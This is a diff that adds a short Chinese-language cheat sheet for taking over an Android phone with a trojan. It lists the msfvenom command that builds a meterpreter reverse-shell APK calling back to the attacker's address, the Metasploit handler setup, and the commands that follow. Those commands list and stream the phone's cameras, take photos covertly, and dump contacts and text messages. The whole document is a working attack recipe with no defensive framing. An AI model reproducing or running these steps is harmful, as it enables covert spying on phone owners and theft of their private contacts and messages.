@@ -1,0 +1,35 @@
+木马入侵手机kali >> android
+
+ifconfig
+# 查看kali的ip地址 192.168.0.106
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=5555 R > /root/apk.apk
+# 生成apk程序(该apk需要安装在目标主机上！！！）
+msfconsole
+# 启动msfconsole
+use exploit/multi/handler   
+# 加载模块
+set payload android/meterpreter/reverse_tcp  
+# 选择Payload
+show options 
+# 查看参数设置
+set LHOST 192.168.0.106   
+# 这里的地址设置成我们刚才生成木马的IP地址
+set LPORT 5555  
+# 这里的端口设置成刚才我们生成木马所监听的端口
+exploit 
+# 开始执行漏洞 开始监听,等待手机上线
+
+webcam_list 
+# 查看手机有多少个摄像头 
+
+webcam_stream 
+# 开启摄像头
+
+webcam_snap 
+# 隐秘拍照功能
+
+dump_contacts 
+# 导出电话号码
+
+dump_sms  
+# 导出信息
